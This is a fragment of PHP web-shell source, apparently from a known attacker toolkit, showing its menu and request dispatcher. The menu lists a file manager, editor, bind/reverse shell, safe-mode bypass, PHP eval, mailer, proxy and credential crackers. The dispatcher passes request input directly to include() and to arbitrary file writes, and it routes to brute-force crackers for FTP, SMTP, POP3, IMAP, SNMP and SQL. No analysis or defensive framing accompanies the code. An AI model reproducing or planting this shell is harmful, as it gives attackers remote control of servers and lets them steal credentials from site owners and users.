<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href="<?php $cwd= getcwd(); echo hlinK("seC=sysinfo&workingdiR=$cwd");?>">[Info]</a> - <a href="<?php echo hlinK("seC=fm&workingdiR=$cwd");?>">[File manager]</a> - <a href="<?php echo hlinK("seC=edit&workingdiR=$cwd");?>">[Editor]</a> - <a href="<?php echo hlinK("seC=webshell&workingdiR=$cwd");?>">[Web shell]</a> - <a href="<?php echo hlinK("seC=br&workingdiR=$cwd");?>">[B/R shell]</a> - <a href="<?php echo hlinK("seC=asm&workingdiR=$cwd");?>">[Safe-mode]</a> - <a href="<?php echo hlinK("seC=mysql&workingdiR=$cwd"); ?>">[SQL]</a> - <a href="<?php echo hlinK("seC=mailer&workingdiR=$cwd"); ?>">[Mailer]</a> - <a href="<?php echo hlinK("seC=eval&workingdiR=$cwd");?>">[Evaler]</a> - <a href="<?php echo hlinK("seC=sc&workingdiR=$cwd"); ?>">[Scanners]</a> - <a href="<?php echo hlinK("seC=cr&workingdiR=$cwd");?>">[Crackers]</a> - <a href="<?php echo hlinK("seC=px&workingdiR=$cwd");?>">[Pr0xy]</a> - <a href="<?php echo hlinK("seC=whois&workingdiR=$cwd");?>">[Whois]</a> - <a href="<?php echo hlinK("seC=calc&workingdiR=$cwd");?>">[Convert]</a> - <a href="<?php echo hlinK("seC=about&workingdiR=$cwd");?>">[About]</a> <?php if(isset($_COOKIE['passw'])) echo "- [<a href=\"".hlinK("seC=logout")."\">Logout</a>]";?></td></tr></table>
<hr size=1 noshade>
<?php
if (!empty($_REQUEST['seC'])){
switch($_REQUEST['seC']){
case 'fm':filemanager();break;
case 'sc':scanneR();break;
case 'phpinfo': phpinfo();break;
case 'edit': if (!empty($_REQUEST['open']))editoR($_REQUEST['filE']);
if (!empty($_REQUEST['Save'])){
$filehandle= fopen($_REQUEST['file'],"w");
fwrite($filehandle,$_REQUEST['edited']);
fclose($filehandle);}
if (!empty($_REQUEST['filE'])) editoR($_REQUEST['filE']);else editoR('');
break;
case 'openit':openiT($_REQUEST['namE']);break;
case 'cr': crackeR();break;
case 'dic':dicmakeR();break;
case 'whois':whoiS();break;
case 'hex':hexvieW();break;
case 'img':showimagE($_REQUEST['filE']);break;
case 'inc':include ($_REQUEST['filE']);break;
case 'hc':hashcrackeR();break;
case 'fcr':formcrackeR();break;
case 'snmp':snmpcrackeR();break;
case 'sql':sqlcrackeR();break;
case 'auth':authcrackeR();break;
case 'pop3':pop3crackeR();break;
case 'imap':imapcrackeR();break;
case 'smtp':smtpcrackeR();break;
case 'ftp':ftpcrackeR();break;
case 'eval':phpevaL();break;
case 'px':pr0xy();break;
case 'webshell':webshelL();break;
case 'mailer':maileR();break;
case 'br':brshelL();break;
case 'asm':safemodE();break;
case 'mysql':mysqlclienT();break;
case 'calc':calC();break;
case 'sysinfo':sysinfO();break;
case 'checksum':checksuM($_REQUEST['filE']);break;
case 'logout':logouT();break;
default: echo $intro;
}}else echo $intro;
echo $footer;?></body></html>
